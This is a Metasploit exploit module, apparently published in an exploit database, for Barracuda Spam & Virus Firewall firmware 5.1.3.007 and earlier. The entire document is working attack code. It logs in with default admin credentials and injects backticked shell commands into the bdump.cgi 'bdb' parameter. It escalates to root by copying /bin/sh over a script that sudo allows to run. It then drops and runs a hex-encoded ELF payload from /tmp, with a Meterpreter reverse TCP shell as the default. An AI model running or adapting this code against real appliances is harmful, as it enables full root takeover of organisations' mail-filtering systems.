# Exploit Title: Barracuda Spam & Virus Firewall Post Auth Remote Root Exploit
# Date: 07/21/16
# Exploit Author: xort xort@blacksecurity.org 
# Vendor Homepage: https://www.barracuda.com/
# Software Link: https://www.barracuda.com/landing/pages/spamfirewall/
# Version: Spam and Virus Firewall <= 5.1.3.007
# Tested on: Spam & Virus Firewall 5.1.3.007 
# CVE : None.

require 'msf/core'
require 'date'
require "base64"

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Barracuda Spam & Virus Firewall (bdump.cgi) Post Auth Root Exploit',
      'Description'    => %q{
          This module exploits a remote command execution vulnerability in
        the Barracuda Spam & Virus firewall firmware version <= 5.1.3.007 by exploiting a
        vulnerability in the web administration interface.
          By sending a specially crafted request it's possible to inject system
         commands while escalating to root do to relaxed sudo configuration on the local 
        machine.
      },  
      'Author'         => [ 'xort' ], # disclosure and exploit module
      'References'     => [ [ 'none', 'none'] ],
      'Platform'       => [ 'linux'],
      'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },
      'Targets' => [['Spam Firewall firmware: 5x', {}]],
      'DefaultTarget'  => 0 ))

      register_options(
        [
          OptString.new('PASSWORD', [ false, 'Password', "admin" ]),  
                 OptString.new('USERNAME', [ true, 'Admin Username', "admin" ]),  
          OptString.new('CMD', [ false, 'Command to execute', "" ]),  
          Opt::RPORT(8000),
        ], self.class)
  end

  def do_login(username, password_clear, et)
    vprint_status( "Logging into machine with credentials...\n" )
    
          # vars
    timeout = 1550;
    enc_key = Rex::Text.rand_text_hex(32)
    
    # send request  
          res = send_request_cgi(
                {
                      'method'  => 'POST',
                      'uri'     => "/cgi-mod/index.cgi",
          'vars_post' =>
            {
              'password_clear' => password_clear,
                'real_user' => "",
                'login_state' => "out",
                'enc_key' => enc_key,
                'et' => et,
                'locale' => "en_US",
                'user' => username,
                'password' => Digest::MD5.hexdigest(username+enc_key),
                'enctype' => "MD5",
                'password_entry' => "",
            }
                }, timeout)

          # get rid of first yank 
          password = res.body.split('\n').grep(/(.*)id=\"password\" value=\"(.*)\"/){$2}[0] #change to match below for more exact result
    et = res.body.split('\n').grep(/(.*)id=\"et\" value=\"([^\"]+)\"/){$2}[0]

    return password, et
  end

  def run_command(username, password, et, cmd)

                # file to replace
                sudo_cmd_exec = "/home/product/code/firmware/current/bin/mysql_add_cluster_user.sh"

    sudo_run_cmd_1 = "sudo /bin/cp /bin/sh #{sudo_cmd_exec} ; sudo /bin/chmod +x #{sudo_cmd_exec}" 
    sudo_run_cmd_2 = "sudo #{sudo_cmd_exec} -c " 

    vprint_status( "Running Command...\n" )

                # random filename to dump too + 'tmp' HAS to be here.
                b64dumpfile = "/tmp/" + rand_text_alphanumeric(4+rand(4))

                # decoder stubs - tells 'base64' command to decode and dump data to temp file
                b64decode1 = "echo \""
                b64decode2 = "\" | base64 -d >" + b64dumpfile

                # base64 - encode with base64 so we can send special chars and multiple lines
    cmd = Base64.strict_encode64(cmd) 

                # Create injection string. 
                #      a) package the  base64 decoder with encoded bytes
                #      b) attach a chmod +x request to make the script created (b64dumpfile) executable
                #      c) execute decoded base64 dumpfile

                injection_string = b64decode1 + cmd + b64decode2 + "; /bin/chmod +x " + b64dumpfile + "; " + sudo_run_cmd_1 + "; " + sudo_run_cmd_2 + b64dumpfile + " ; rm " + 
b64dumpfile
  
    vprint_status( "sending..." )
          res = send_request_cgi({
              'method' => 'GET',
             'uri'    => "/cgi-mod/bdump.cgi",
       'headers' => 
      {
        'Accept' => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        'UserAgent' => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",
        'Accept-Language' => "en-US,en;q=0.5"
      },
        'vars_get' => {
                'password' => password, 
                'et' => et,
                'user' => username,
                'role' => 'admin',
      '_dc' => '',
                'bdb' => '`' + injection_string + '`',
                'locale' => 'en_US'
            }
          })  
  end

  def exploit

    # params
    timeout = 1550;

                real_user = "";
    et = Time.now.to_i  
    user = datastore['USERNAME']
    password = datastore['PASSWORD']

    # do login and get password hash
    password_hash, et = do_login(user, password, et)
    vprint_status("got password hash: #{password_hash}\n")
    sleep(2)
  
    # clean up hanging prior request   
    run_command(user, password_hash, et, ("ps -df|grep bdump|awk '{print $2}' | xargs kill -9"))
    sleep(5)

                #if no 'CMD' string - add code for root shell
    if not datastore['CMD'].nil? and not datastore['CMD'].empty?

      cmd = datastore['CMD']  
      
      # Encode cmd payload  
      encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2') 

      # kill stale calls to bdump from previous exploit calls for re-use
      run_command(user, password_hash, et, ("sudo /bin/rm -f /tmp/n ;printf \"#{encoded_cmd}\" > /tmp/n; chmod +rx /tmp/n ; /tmp/n" ))
    else  
      # Encode payload to ELF file for deployment  
      elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
            encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2') 

      # kill stale calls to bdump from previous exploit calls for re-use
      run_command(user, password_hash, et, ("sudo /bin/rm -f /tmp/m ;printf \"#{encoded_elf}\" > /tmp/m; chmod +rx /tmp/m ; /tmp/m" ))
    
      handler
    end
  end
end